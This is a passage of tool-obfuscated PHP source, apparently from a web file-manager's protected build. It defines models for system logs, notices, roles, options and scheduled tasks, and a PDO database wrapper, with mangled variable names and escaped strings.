$Ô¦ï±âŞ[$üÑÏ»ˆ„[234]] = array($üÑÏ»ˆ„[411], array($õà­ßâê, $¼ßÄ³¥ä)); } if ($û¦ëû·[$üÑÏ»ˆ„[33]]) { $ä±‘ØÃö = explode($üÑÏ»ˆ„[50], $û¦ëû·[$üÑÏ»ˆ„[33]]); $¬¬†Î· = $this->typeFile(); $¢’“ı = array(); foreach ($ä±‘ØÃö as $¼ú¼×ø) { $¢’“ı[] = $¼ú¼×ø; if (isset($¬¬†Î·[$¼ú¼×ø])) { $¢’“ı = array_merge($¢’“ı, $¬¬†Î·[$¼ú¼×ø]); } } $¢’“ı = array_unique($¢’“ı); if ($¢’“ı) { $Ô¦ï±âŞ[$üÑÏ»ˆ„[33]] = array($üÑÏ»ˆ„[7], $¢’“ı); } } else { $Ô¦ï±âŞ[$üÑÏ»ˆ„[33]] = array($üÑÏ»ˆ„[2453], $üÑÏ»ˆ„[2454]); } if (!empty($û¦ëû·[$üÑÏ»ˆ„[2452]])) { $Ô¦ï±âŞ[$üÑÏ»ˆ„[529]] = array($üÑÏ»ˆ„[462], "\x25{$û¦ëû·[$üÑÏ»ˆ„[2452]]}\45"); } $ÊÅŒŠ›ö = $this->_makeOrder()->where($Ô¦ï±âŞ)->selectPage(); if (empty($ÊÅŒŠ›ö[$üÑÏ»ˆ„[448]])) { show_json(array(), !0, $ÊÅŒŠ›ö[$üÑÏ»ˆ„[445]]); } $ÊÅŒŠ›ö[$üÑÏ»ˆ„[448]] = $this->logList($ÊÅŒŠ›ö[$üÑÏ»ˆ„[448]]); return $ÊÅŒŠ›ö; } private function ipAddress(&$—“’ÅÇæ) { $µåŞ¶’õ =& $_SERVER[«òÑğ]; if (!empty($—“’ÅÇæ[$µåŞ¶’õ[2452]])) { $áöèÄ¢¡ = IpLocation::get($—“’ÅÇæ[$µåŞ¶’õ[2452]]); } else { $áöèÄ¢¡ = LNG($µåŞ¶’õ[2455]); } $—“’ÅÇæ[$µåŞ¶’õ[2456]] = $áöèÄ¢¡; } private function descZipDownload($Øßıéï×, &$•úı„ÔË) { $¼‹¦Õƒ =& $_SERVER[«òÑğ]; if (!isset($Øßıéï×[$¼‹¦Õƒ[2457]])) { return; } $ƒ›±¡– = json_decode($Øßıéï×[$¼‹¦Õƒ[2457]], !0); foreach ($ƒ›±¡– as $û·‘ß¹Ÿ) { try { $¹Ë¼Û¢ = IO::infoFullSimple($û·‘ß¹Ÿ[$¼‹¦Õƒ[87]]); } catch (Exception $œ¼é­Ìí) { continue; } $Øßıéï×[$¼‹¦Õƒ[87]] = $û·‘ß¹Ÿ[$¼‹¦Õƒ[87]]; $•úı„ÔË[] = $Øßıéï×[$¼‹¦Õƒ[194]] = $¹Ë¼Û¢[$¼‹¦Õƒ[194]]; $•úı„ÔË[] = $Øßıéï×[$¼‹¦Õƒ[2222]] = $¹Ë¼Û¢[$¼‹¦Õƒ[193]]; break; } return $Øßıéï×; } private function getSourceList(&$¡èÙûÄÅ) { $×üµÁõ =& $_SERVER[«òÑğ]; $§ğ³œï£ = array(); foreach ($¡èÙûÄÅ as $„¤¶§Ë¦ => $ñ§ƒ„) { $æ–ËÅ = json_decode($ñ§ƒ„[$×üµÁõ[529]], !0); if ($ñ§ƒ„[$×üµÁõ[33]] == $×üµÁõ[1958]) { $æ–ËÅ = $this->descZipDownload($æ–ËÅ, $§ğ³œï£); $¡èÙûÄÅ[$„¤¶§Ë¦][$×üµÁõ[529]] = json_encode($æ–ËÅ); continue; } if (strpos($ñ§ƒ„[$×üµÁõ[33]], $×üµÁõ[2224]) !== 0) { if (!isset($æ–ËÅ[$×üµÁõ[87]]) || strpos($ñ§ƒ„[$×üµÁõ[33]], $×üµÁõ[2458]) !== 0) { continue; } try { $½Î¿«’¢ = IO::infoFullSimple($æ–ËÅ[$×üµÁõ[87]]); } catch (Exception $š®ü…‰Ù) { continue; } $§ğ³œï£[] = $æ–ËÅ[$×üµÁõ[194]] = $½Î¿«’¢[$×üµÁõ[194]]; $§ğ³œï£[] = $æ–ËÅ[$×üµÁõ[2222]] = $½Î¿«’¢[$×üµÁõ[193]]; $¡èÙûÄÅ[$„¤¶§Ë¦][$×üµÁõ[529]] = json_encode($æ–ËÅ); continue; } $§ğ³œï£[] = $æ–ËÅ[$×üµÁõ[194]]; $§ğ³œï£[] = $æ–ËÅ[$×üµÁõ[2222]]; if ($æ–ËÅ[$×üµÁõ[33]] == $×üµÁõ[628]) { $§ğ³œï£[] = $æ–ËÅ[$×üµÁõ[529]][$×üµÁõ[1251]]; $§ğ³œï£[] = $æ–ËÅ[$×üµÁõ[529]][$×üµÁõ[1252]]; } if ($æ–ËÅ[$×üµÁõ[33]] == $×üµÁõ[2233]) { $§ğ³œï£[] = $æ–ËÅ[$×üµÁõ[529]][$×üµÁõ[194]]; } } if (!$§ğ³œï£) { return array(); } return Model($×üµÁõ[914])->sourceListInfo($§ğ³œï£, !0); } private function logList($é õ©Î) { $ªáƒş— =& $_SERVER[«òÑğ]; $ÕÁààøÂ = array_to_keyvalue($é õ©Î, $ªáƒş—[12], $ªáƒş—[1784]); $Ñ¬¶œÎ = Model($ªáƒş—[602])->userListInfo(array_unique($ÕÁààøÂ)); $¨´¨Ó² = $this->getSourceList($é õ©Î); $“¹ˆ†ªò = $this->typeAll(); $³‹ñòû = array(); $„‡âÕê» = array(); foreach ($é õ©Î as $³ÖÌÑÕˆ => $úÒÄÉ¢) { $ŞÒ½ ÈĞ = $úÒÄÉ¢[$ªáƒş—[33]]; $ñ«¢¯Úš = isset($Ñ¬¶œÎ[$úÒÄÉ¢[$ªáƒş—[1784]]]) ? $Ñ¬¶œÎ[$úÒÄÉ¢[$ªáƒş—[1784]]] : !1; $‘ŸÀÍÏ¨ = strpos($ŞÒ½ ÈĞ, $ªáƒş—[2459]) === 0 ? LNG($ªáƒş—[2460]) : LNG($ªáƒş—[2455]); $úÒÄÉ¢[$ªáƒş—[32]] = isset($ñ«¢¯Úš[$ªáƒş—[32]]) ? $ñ«¢¯Úš[$ªáƒş—[32]] : LNG($ªáƒş—[2455]); $úÒÄÉ¢[$ªáƒş—[2284]] = isset($ñ«¢¯Úš[$ªáƒş—[2284]]) ? $ñ«¢¯Úš[$ªáƒş—[2284]] : $ªáƒş—[12]; $úÒÄÉ¢[$ªáƒş—[1671]] = isset($“¹ˆ†ªò[$ŞÒ½ ÈĞ]) ? $“¹ˆ†ªò[$ŞÒ½ ÈĞ] : $‘ŸÀÍÏ¨; $úÒÄÉ¢[$ªáƒş—[2165]] = $ñ«¢¯Úš; $àïïœÄ = json_decode($úÒÄÉ¢[$ªáƒş—[529]], !0); $úÒÄÉ¢[$ªáƒş—[2452]] = isset($àïïœÄ[$ªáƒş—[2452]]) ? $àïïœÄ[$ªáƒş—[2452]] : $ªáƒş—[12]; $úÒÄÉ¢[$ªáƒş—[2456]] = IpLocation::get($úÒÄÉ¢[$ªáƒş—[2452]]); if (strpos($ŞÒ½ ÈĞ, $ªáƒş—[2224]) === 0 || isset($àïïœÄ[$ªáƒş—[2222]])) { $àïïœÄ[$ªáƒş—[90]] = $¨´¨Ó²[$àïïœÄ[$ªáƒş—[194]]]; $àïïœÄ[$ªáƒş—[2238]] = $¨´¨Ó²[$àïïœÄ[$ªáƒş—[2222]]]; if ($àïïœÄ[$ªáƒş—[33]] == $ªáƒş—[628]) { $àïïœÄ[$ªáƒş—[529]][$ªáƒş—[1251]] = $¨´¨Ó²[$àïïœÄ[$ªáƒş—[529]][$ªáƒş—[1251]]]; $àïïœÄ[$ªáƒş—[529]][$ªáƒş—[1252]] = $¨´¨Ó²[$àïïœÄ[$ªáƒş—[529]][$ªáƒş—[1252]]]; } if ($àïïœÄ[$ªáƒş—[33]] == $ªáƒş—[2233]) { $àïïœÄ[$ªáƒş—[529]][$ªáƒş—[194]] = $¨´¨Ó²[$àïïœÄ[$ªáƒş—[529]][$ªáƒş—[194]]]; } if ($àïïœÄ[$ªáƒş—[33]] == $ªáƒş—[1953]) { $àïïœÄ[$ªáƒş—[2238]] = $àïïœÄ[$ªáƒş—[90]]; $àïïœÄ[$ªáƒş—[2222]] = $àïïœÄ[$ªáƒş—[2238]][$ªáƒş—[194]]; $àïïœÄ[$ªáƒş—[90]] = !1; $àïïœÄ[$ªáƒş—[194]] = $ªáƒş—[12]; } $êáÊ™ÜÉ = array($ªáƒş—[1953], $ªáƒş—[2220]); if (!in_array($àïïœÄ[$ªáƒş—[33]], $êáÊ™ÜÉ)) { if ($àïïœÄ[$ªáƒş—[90]] && $àïïœÄ[$ªáƒş—[90]][$ªáƒş—[191]] == $ªáƒş—[192]) { $„‡âÕê»[] = $úÒÄÉ¢[$ªáƒş—[478]]; unset($é õ©Î[$³ÖÌÑÕˆ]); continue; } if ($àïïœÄ[$ªáƒş—[2238]] && $àïïœÄ[$ªáƒş—[2238]][$ªáƒş—[191]] == $ªáƒş—[192]) { $„‡âÕê»[] = $úÒÄÉ¢[$ªáƒş—[478]]; unset($é õ©Î[$³ÖÌÑÕˆ]); continue; } } } $úÒÄÉ¢[$ªáƒş—[529]] = $àïïœÄ; unset($úÒÄÉ¢[$ªáƒş—[2461]]); $³‹ñòû[] = $úÒÄÉ¢; } $this->clearSystemPathLog($„‡âÕê»); return $³‹ñòû; } private function clearSystemPathLog($¡¡¡ˆñ°) { $úÄğø² =& $_SERVER[«òÑğ]; if (count($¡¡¡ˆñ°) == 0) { return; } $ÑÕĞŠòÁ = array($úÄğø²[478] => array($úÄğø²[7], array_unique($¡¡¡ˆñ°))); $this->where($ÑÕĞŠòÁ)->delete(); } public function deviceList($äâº‘±°, $şÙàîÆ‡ = 0) { $¿ÚŞ«î¯ =& $_SERVER[«òÑğ]; $İçæ¨ÈÉ = array($¿ÚŞ«î¯[1784] => $äâº‘±°, $¿ÚŞ«î¯[234] => array($¿ÚŞ«î¯[1101], $şÙàîÆ‡), $¿ÚŞ«î¯[33] => $¿ÚŞ«î¯[1927]); $í€”“‰ = array(); $Ö°‚ß¸½ = $this->field($¿ÚŞ«î¯[2462])->where($İçæ¨ÈÉ)->order($¿ÚŞ«î¯[2236])->limit(50)->select(); foreach ($Ö°‚ß¸½ as $™¼Ä½‡å => $šŸò­Âä) { if ($™¼Ä½‡å > 0 && abs($šŸò­Âä[$¿ÚŞ«î¯[234]] - $Ö°‚ß¸½[$™¼Ä½‡å - 1][$¿ÚŞ«î¯[234]]) < 5) { continue; } $ùÛô§Ç¼ = json_decode($šŸò­Âä[$¿ÚŞ«î¯[529]], !0); $šŸò­Âä[$¿ÚŞ«î¯[2452]] = isset($ùÛô§Ç¼[$¿ÚŞ«î¯[2452]]) ? $ùÛô§Ç¼[$¿ÚŞ«î¯[2452]] : $¿ÚŞ«î¯[12]; unset($ùÛô§Ç¼[$¿ÚŞ«î¯[2452]]); $ØÅ¼¡Ôá = $this->deviceType($ùÛô§Ç¼[$¿ÚŞ«î¯[2225]]); if (isset($í€”“‰[$ØÅ¼¡Ôá])) { continue; } $šŸò­Âä[$¿ÚŞ«î¯[2456]] = IpLocation::get($šŸò­Âä[$¿ÚŞ«î¯[2452]]); $šŸò­Âä[$¿ÚŞ«î¯[529]] = $ùÛô§Ç¼; $í€”“‰[$ØÅ¼¡Ôá] = $šŸò­Âä; } return array_values($í€”“‰); } public function deviceType($¡æÂ¶) { return $¡æÂ¶; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\x6e\157\x74\x69\143\145\x4c\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\143\x6f\x6e\x74\x65\156\164", "\141\165\164\x68", "\x6d\157\144\145", "\164\x69\155\x65", "\x74\171\160\x65", "\154\145\x76\145\x6c", "\145\156\141\x62\x6c\x65", "\x73\157\162\x74"); public function listData($Â‡—®ÅÁ = false, $âÀ±ÉĞÙ = "\163\157\162\164", $—¦ı¿‹â = false) { return parent::listData($Â‡—®ÅÁ, $âÀ±ÉĞÙ, $—¦ı¿‹â); } public function add($ö¹üí°) { $ÆÛÕÔÎ =& $_SERVER[«òÑğ]; $Ë²¤ŸŞ = time(); if ($ö¹üí°[$ÆÛÕÔÎ[16]] == $ÆÛÕÔÎ[2463]) { $Ë²¤ŸŞ = strtotime($ö¹üí°[$ÆÛÕÔÎ[207]]); } $ö¹üí°[$ÆÛÕÔÎ[207]] = $Ë²¤ŸŞ; return parent::insert($ö¹üí°); } public function update($èóåËø, $È»¤¼Ş) { $ş©±ûŞ¿ =& $_SERVER[«òÑğ]; $ù²±İË = $this->listData($èóåËø); if (!$ù²±İË) { return !1; } $ÕğÛµõ… = time(); if ($È»¤¼Ş[$ş©±ûŞ¿[16]] == $ş©±ûŞ¿[2463]) { $ÕğÛµõ… = strtotime($È»¤¼Ş[$ş©±ûŞ¿[207]]); } $È»¤¼Ş[$ş©±ûŞ¿[207]] = $ÕğÛµõ…; return parent::update($èóåËø, $È»¤¼Ş); } public function remove($³³Å¼¨Ë) { $æ¬‡Íş• = $this->listData($³³Å¼¨Ë); if (!$æ¬‡Íş• || $æ¬‡Íş•[$_SERVER[«òÑğ][192]]) { return !1; } return parent::remove($³³Å¼¨Ë); } public function sort($€ÃÈ…Ñİ, $í‰àù©¥) { return parent::update($€ÃÈ…Ñİ, $í‰àù©¥); } public function enable($€¹ĞĞğÛ, $åïş©·ƒ) { return parent::update($€¹ĞĞğÛ, array($_SERVER[«òÑğ][2464] => $åïş©·ƒ)); } private function initUserOption() { $»Ú­ˆÃ» =& $_SERVER[«òÑğ]; $this->optionType = $»Ú­ˆÃ»[2465]; $this->modelType = $»Ú­ˆÃ»[2466]; $this->field = array($»Ú­ˆÃ»[2467], $»Ú­ˆÃ»[32], $»Ú­ˆÃ»[207], $»Ú­ˆÃ»[33], $»Ú­ˆÃ»[2468], $»Ú­ˆÃ»[834], $»Ú­ˆÃ»[229]); } public function userNoticeGet($Ñïñ‚šÎ = false) { $this->initUserOption(); return parent::listData($Ñïñ‚šÎ, $_SERVER[«òÑğ][478], !0); } public function userNoticeAdd($Æ·¼Â¾) { $Á‰àª±‡ =& $_SERVER[«òÑğ]; $this->initUserOption(); $Ñíá ‘‰ = $this->findByKey($Á‰àª±‡[2467], $Æ·¼Â¾[$Á‰àª±‡[478]]); if ($Ñíá ‘‰) { return !0; } $§£Ë¶ú÷ = array($Á‰àª±‡[2467] => $Æ·¼Â¾[$Á‰àª±‡[478]], $Á‰àª±‡[32] => $Æ·¼Â¾[$Á‰àª±‡[32]], $Á‰àª±‡[207] => $Æ·¼Â¾[$Á‰àª±‡[207]], $Á‰àª±‡[33] => isset($Æ·¼Â¾[$Á‰àª±‡[33]]) ? $Æ·¼Â¾[$Á‰àª±‡[33]] : 1, $Á‰àª±‡[2468] => isset($Æ·¼Â¾[$Á‰àª±‡[2468]]) ? $Æ·¼Â¾[$Á‰àª±‡[2468]] : 0, $Á‰àª±‡[834] => 0, $Á‰àª±‡[229] => 0); return parent::insert($§£Ë¶ú÷); } public function userNoticeEdit($ŠÂññß, $–ø®ÍÖÄ) { $this->initUserOption(); return parent::update($ŠÂññß, $–ø®ÍÖÄ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\155\x5f\157\x70\164\x69\x6f\156"; protected $jsonField = array("\x6d\145\156\165", "\x72\x6f\154\145", "\162\157\x6c\145\x47\x72\x6f\165\x70", "\162\x65\x67\151\x73\164", "\145\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($¬Òİâ·‡) { return "\x53\x79\x73\x74\145\x6d\117\160\x74\x69\157\x6e\137{$¬Òİâ·‡}"; } protected function optionDefault($ÀñÕşˆş = '') { $î”Ç¸Ë =& $_SERVER[«òÑğ]; if ($ÀñÕşˆş == $î”Ç¸Ë[12]) { return $GLOBALS[$î”Ç¸Ë[6]][$î”Ç¸Ë[460]]; } } } goto dÛ»ƒÂ”øÁ; dÛ»ƒÂ”øÁ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\x72\x6f\154\145\x4c\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\141\x75\164\150", "\x6c\141\x62\145\x6c", "\144\151\163\160\x6c\x61\x79", "\x73\x79\163\x74\145\155", "\x64\145\x73\x63", "\x69\147\x6e\157\162\x65\x45\x78\164", "\151\147\x6e\157\x72\x65\106\x69\x6c\x65\123\151\x7a\145", "\x61\x64\155\151\156\x69\163\x74\162\141\164\x6f\x72", "\x73\157\162\x74"); public function listData($ÇïŠÈš‰ = false, $•µÊ½†» = "\x73\x6f\x72\164", $ºú„¼ç¯ = false) { $½‡Û¯î‘ =& $_SERVER[«òÑğ]; $ûˆˆÇšˆ = parent::listData($ÇïŠÈš‰, $•µÊ½†», $ºú„¼ç¯); if (!$ÇïŠÈš‰) { foreach ($ûˆˆÇšˆ as $Ø…äÛÑ => $ÆÊ’Ş¤õ) { if ($ÆÊ’Ş¤õ[$½‡Û¯î‘[2196]] == 1) { $ûˆˆÇšˆ[$Ø…äÛÑ][$½‡Û¯î‘[529]] = LNG($½‡Û¯î‘[2469]); } } } return $ûˆˆÇšˆ; } public function update($Õöë‘ ı, $Æ‡¦óŒ) { $»ºÙèéÔ =& $_SERVER[«òÑğ]; $å…”Š¤ = parent::listData($Õöë‘ ı); $ÜÙõÀË“ = $this->findByName($Æ‡¦óŒ[$»ºÙèéÔ[32]]); if (!$å…”Š¤ || $ÜÙõÀË“ && $ÜÙõÀË“[$»ºÙèéÔ[478]] != $å…”Š¤[$»ºÙèéÔ[478]]) { return !1; } if ($ÜÙõÀË“[$»ºÙèéÔ[2196]] == 1) { $Æ‡¦óŒ = array($»ºÙèéÔ[32] => $Æ‡¦óŒ[$»ºÙèéÔ[32]], $»ºÙèéÔ[2008] => $Æ‡¦óŒ[$»ºÙèéÔ[2008]]); } $this->filterAuth($Æ‡¦óŒ[$»ºÙèéÔ[490]]); return parent::update($Õöë‘ ı, $Æ‡¦óŒ); } public function remove($›Ÿ÷ÌàÄ) { $è´†Üãâ = parent::listData($›Ÿ÷ÌàÄ); if (!$è´†Üãâ || $è´†Üãâ[$_SERVER[«òÑğ][192]]) { return !1; } return parent::remove($›Ÿ÷ÌàÄ); } public function add($”óÛµÙ¹) { $Ò¸³ÆÛ÷ =& $_SERVER[«òÑğ]; $òˆ»ú»ğ = $”óÛµÙ¹[$Ò¸³ÆÛ÷[32]]; if ($this->findByName($òˆ»ú»ğ)) { return !1; } $Èã§İÓƒ = array($Ò¸³ÆÛ÷[497] => $òˆ»ú»ğ, $Ò¸³ÆÛ÷[1991] => $Ò¸³ÆÛ÷[12], $Ò¸³ÆÛ÷[1987] => $Ò¸³ÆÛ÷[1995], $Ò¸³ÆÛ÷[2470] => 1, $Ò¸³ÆÛ÷[1990] => 0, $Ò¸³ÆÛ÷[2471] => 0, $Ò¸³ÆÛ÷[1989] => $this->getSort()); $”óÛµÙ¹ = array_merge($Èã§İÓƒ, $”óÛµÙ¹); $this->filterAuth($”óÛµÙ¹[$Ò¸³ÆÛ÷[490]]); return parent::insert($”óÛµÙ¹); } private function getSort() { $ÇŒ¨›½â =& $_SERVER[«òÑğ]; $¬¹€™¾Ê = parent::listData(); $…ú¸Åûù = array_to_keyvalue($¬¹€™¾Ê, $ÇŒ¨›½â[12], $ÇŒ¨›½â[2009]); return empty($…ú¸Åûù) ? 0 : max($…ú¸Åûù) + 1; } private function filterAuth(&$ì‚éÄ§Ô) { $ª â¢ı½ =& $_SERVER[«òÑğ]; $ëˆšÛ» = array(); $ñÀ€ÆØÁ = array_filter(explode($ª â¢ı½[50], $ì‚éÄ§Ô)); foreach ($ñÀ€ÆØÁ as $ì‚éÄ§Ô) { $ü‰£ºåò = explode($ª â¢ı½[10], $ì‚éÄ§Ô); if ($ü‰£ºåò[0] == $ª â¢ı½[2472] && $ü‰£ºåò[1] != $ª â¢ı½[1285]) { $¼ÈÆ˜á = $ü‰£ºåò[0] . $ª â¢ı½[10] . $ü‰£ºåò[1] . $ª â¢ı½[2473]; if (!in_array($¼ÈÆ˜á, $ñÀ€ÆØÁ)) { $ëˆšÛ»[] = $¼ÈÆ˜á; } } $ëˆšÛ»[] = $ì‚éÄ§Ô; } $ì‚éÄ§Ô = implode($ª â¢ı½[50], $ëˆšÛ»); } public function findRoleDefault() { $—çé—×ş =& $_SERVER[«òÑğ]; $£ôè²¹¾ = parent::listData(); $”Õ•šĞä = !1; foreach ($£ôè²¹¾ as $ğÄ¤ì‘) { if (!$ğÄ¤ì‘ || $ğÄ¤ì‘[$—çé—×ş[2007]] == $—çé—×ş[231] || $ğÄ¤ì‘[$—çé—×ş[2196]] == 1) { continue; } if (strstr($ğÄ¤ì‘[$—çé—×ş[490]], $—çé—×ş[2474])) { continue; } if (!strstr($ğÄ¤ì‘[$—çé—×ş[490]], $—çé—×ş[2475])) { continue; } if (!$”Õ•šĞä) { $”Õ•šĞä = $ğÄ¤ì‘; continue; } $Ï®¼İõô = explode($—çé—×ş[50], $”Õ•šĞä[$—çé—×ş[490]]); $Óûµª‘ø = explode($—çé—×ş[50], $ğÄ¤ì‘[$—çé—×ş[490]]); if (count($Ï®¼İõô) > count($Óûµª‘ø)) { $”Õ•šĞä = $ğÄ¤ì‘; } } return $”Õ•šĞä ? $”Õ•šĞä[$—çé—×ş[478]] : $—çé—×ş[12]; } public function sort($²ÁöÈ, $ÚîÜÃ“î) { return parent::update($²ÁöÈ, $ÚîÜÃ“î); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x74\141\x73\x6b\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\164\x79\x70\x65", "\x65\x76\x65\x6e\164", "\x74\151\155\x65", "\x64\x65\163\143", "\x73\x79\x73\164\145\155", "\145\x6e\141\142\154\x65", "\154\141\x73\164\x52\x75\x6e", "\x73\157\162\x74"); public function listData($êëÊÃÊ± = false, $¡­Š¬˜İ = "\x73\x6f\x72\164", $Ôğàû“× = false) { return parent::listData($êëÊÃÊ±, $¡­Š¬˜İ, $Ôğàû“×); } public function add($¬›êÍªÜ) { $¼„ËÒº =& $_SERVER[«òÑğ]; $ãÌÒñ© = $this->findByName($¬›êÍªÜ[$¼„ËÒº[32]]); if ($ãÌÒñ©) { return !1; } $¬›êÍªÜ[$¼„ËÒº[1734]] = 0; $¬›êÍªÜ[$¼„ËÒº[2009]] = $this->getSort(); return parent::insert($¬›êÍªÜ); } private function getSort() { $ĞìÛŸ© =& $_SERVER[«òÑğ]; $ô¥¯™ı± = parent::listData(); $”ªşŞ÷à = array_to_keyvalue($ô¥¯™ı±, $ĞìÛŸ©[12], $ĞìÛŸ©[2009]); return empty($”ªşŞ÷à) ? 0 : max($”ªşŞ÷à) + 1; } public function update($«ú™‘ú, $›»š”ì×) { $½¤¨ñºÚ =& $_SERVER[«òÑğ]; $»Ò•¨†© = $this->listData($«ú™‘ú); $Îç¤«î = $this->findByName($›»š”ì×[$½¤¨ñºÚ[32]]); if (!$»Ò•¨†© || $Îç¤«î && $Îç¤«î[$½¤¨ñºÚ[478]] != $»Ò•¨†©[$½¤¨ñºÚ[478]]) { return !1; } return parent::update($«ú™‘ú, $›»š”ì×); } public function remove($ÔÌ‡±‹, $áğÔ³À = false) { $à‡ô¨åÊ =& $_SERVER[«òÑğ]; $¾ Î®êß = $this->listData($ÔÌ‡±‹); if (!$¾ Î®êß) { return; } if (!$áğÔ³À && $¾ Î®êß[$à‡ô¨åÊ[192]] == $à‡ô¨åÊ[91]) { return !1; } return parent::remove($ÔÌ‡±‹); } public function enable($õ®Ã·“ø, $ÙÒÖ‚×æ) { return $this->update($õ®Ã·“ø, array($_SERVER[«òÑğ][2464] => $ÙÒÖ‚×æ)); } public function run($£¥ºÈèš) { return $this->update($£¥ºÈèš, array($_SERVER[«òÑğ][2476] => time())); } } goto cÃÕÉœİØ; bÃï§ó‘¬×: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Á«¡µ—û = '') { $ÑÏ‚ëÈÅ =& $_SERVER[«òÑğ]; if (!class_exists($ÑÏ‚ëÈÅ[1001])) { think_exception(think_lang($ÑÏ‚ëÈÅ[14]) . $ÑÏ‚ëÈÅ[1002]); } if (!empty($Á«¡µ—û)) { $this->config = $Á«¡µ—û; if (empty($this->config[$ÑÏ‚ëÈÅ[17]])) { $this->config[$ÑÏ‚ëÈÅ[17]] = array(); } } } public function connect($ôåğÁ± = '', $µ“íÒõ = 0) { $ø±½úñÇ =& $_SERVER[«òÑğ]; if (!isset($this->linkID[$µ“íÒõ])) { if (empty($ôåğÁ±)) { $ôåğÁ± = $this->config; } $—ì¬‰ = !empty($ôåğÁ±[$ø±½úñÇ[17]][$ø±½úñÇ[18]]) ? $ôåğÁ±[$ø±½úñÇ[17]][$ø±½úñÇ[18]] : $this->pconnect; if ($—ì¬‰) { $ôåğÁ±[$ø±½úñÇ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$µ“íÒõ] = new PDO($ôåğÁ±[$ø±½úñÇ[1003]], $ôåğÁ±[$ø±½úñÇ[975]], $ôåğÁ±[$ø±½úñÇ[976]], $ôåğÁ±[$ø±½úñÇ[17]]); } catch (PDOException $½ıª¢Æ–) { think_exception($½ıª¢Æ–->getMessage()); } $this->dbType = $this->_getDsnType($ôåğÁ±[$ø±½úñÇ[1003]]); if (in_array($this->dbType, array($ø±½úñÇ[1004], $ø±½úñÇ[1005], $ø±½úñÇ[1006], $ø±½úñÇ[1007]))) { think_exception($ø±½úñÇ[1008] . $this->dbType . $ø±½úñÇ[1009] . $this->dbType . $ø±½úñÇ[1010]); } if (!$this->linkID[$µ“íÒõ]) { think_exception($ø±½úñÇ[1011]); } try { $this->linkID[$µ“íÒõ]->exec($ø±½úñÇ[1012] . think_config($ø±½úñÇ[978])); } catch (Exception $½ıª¢Æ–) { } $this->connected = !0; if (1 != think_config($ø±½úñÇ[22])) { unset($this->config); } } return $this->linkID[$µ“íÒõ]; } public function free() { $this->PDOStatement = null; } public function query($±¼„£Ù‘, $À‘°¾· = array()) { $Îëíİ— =& $_SERVER[«òÑğ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±¼„£Ù‘; if (!empty($À‘°¾·)) { $this->queryStr .= $Îëíİ—[1013] . print_r($À‘°¾·, !0) . $Îëíİ—[1014]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Îëíİ—[23], 1); think_status($Îëíİ—[24]); $this->PDOStatement = $this->_linkID->prepare($±¼„£Ù‘); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $šõ®®¦Ø = $this->PDOStatement->execute($À‘°¾·); $this->debug(); if (!1 === $šõ®®¦Ø) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ö¬¦ŒâÎ, $ÊŸ€· × = array()) { $åğ·¬ùï =& $_SERVER[«òÑğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ö¬¦ŒâÎ; if (!empty($ÊŸ€· ×)) { $this->queryStr .= $åğ·¬ùï[1013] . print_r($ÊŸ€· ×, !0) . $åğ·¬ùï[1014]; } $¦äş›£ = !1; if ($this->dbType == $åğ·¬ùï[1007]) { if (preg_match($åğ·¬ùï[1015], $this->queryStr, $ÛÉ®•µ¹)) { $this->table = think_config($åğ·¬ùï[1016]) . str_ireplace(think_config($åğ·¬ùï[1017]), $åğ·¬ùï[457], $ÛÉ®•µ¹[2]); $¦äş›£ = (bool) $this->query($åğ·¬ùï[1018] . strtoupper($this->table) . $åğ·¬ùï[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($åğ·¬ùï[25], 1); think_status($åğ·¬ùï[24]); $this->PDOStatement = $this->_linkID->prepare($ö¬¦ŒâÎ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $´¦Ñİõ = $this->PDOStatement->execute($ÊŸ€· ×); $this->debug(); if (!1 === $´¦Ñİõ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¦äş›£ || preg_match($åğ·¬ùï[1019], $ö¬¦ŒâÎ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $´ÊÕüÁ = $this->_linkID->commit(); $this->transTimes = 0; if (!$´ÊÕüÁ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $’ï€Ë¨ú = $this->_linkID->rollback(); $this->transTimes = 0; if (!$’ï€Ë¨ú) { $this->error(); return !1; } } return !0; } private function getAll() { $úÆ¡šö¬ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($úÆ¡šö¬); return $úÆ¡šö¬; } public function getFields($á©Ïšê) { $±ú³ÀÊø =& $_SERVER[«òÑğ]; $this->initConnect(!0); if (think_config($±ú³ÀÊø[1020])) { $ÀŞ¦Ÿ¼ = str_replace($±ú³ÀÊø[1021], $á©Ïšê, think_config($±ú³ÀÊø[1020])); } else { switch ($this->dbType) { case $±ú³ÀÊø[1004]: case $±ú³ÀÊø[1022]: $ÀŞ¦Ÿ¼ = 